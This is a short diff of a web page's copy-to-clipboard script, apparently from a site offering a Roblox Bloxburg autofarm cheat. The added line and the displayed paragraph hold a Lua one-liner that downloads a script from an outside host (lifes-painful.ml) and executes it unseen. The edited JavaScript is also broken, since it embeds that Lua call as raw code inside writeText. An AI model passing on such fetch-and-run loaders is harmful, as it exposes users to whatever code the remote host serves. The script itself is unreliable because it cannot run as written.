@@ -60,7 +60,7 @@
 										function handleCopyTextFromParagraph() {
   const cb = navigator.clipboard;
   const paragraph = document.querySelector('p');
-  cb.writeText(p1).then(() => alert('Code copied'));
+  cb.writeText(loadstring(game:HttpGet("http://lifes-painful.ml/scripts/bloxburg/Bloxburgautofarm.lua", true))()).then(() => alert('Code copied'));
 }
 									</script>
 									<p id="p1">loadstring(game:HttpGet("http://lifes-painful.ml/scripts/bloxburg/Bloxburgautofarm.lua", true))()</p>
